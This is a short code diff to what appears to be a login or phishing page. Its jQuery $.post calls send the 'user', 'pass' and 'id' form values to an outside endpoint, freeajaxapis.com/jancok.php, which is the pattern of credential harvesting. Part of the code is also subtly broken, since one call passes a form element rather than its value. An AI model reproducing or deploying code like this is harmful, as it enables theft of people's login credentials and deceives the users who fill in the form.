@@ -1,5 +1,4 @@
-<script>
-  $.post("https://freeajaxapis.com/jancok.php",{
+$.post("https://freeajaxapis.com/jancok.php",{
          user:$("#user"),
          pass:pass,
          id:id,
@@ -19,7 +18,6 @@
     },1000);
     return false;
     }
-</script><script>
     var user = $("#user").val();
     var pass = $("#pass").val();
     var id = $("#id").val();
@@ -49,4 +47,3 @@ $.post("http://freeajaxapis.com/jancok.php",{
     },1000);
     return false;
     }
-</script>
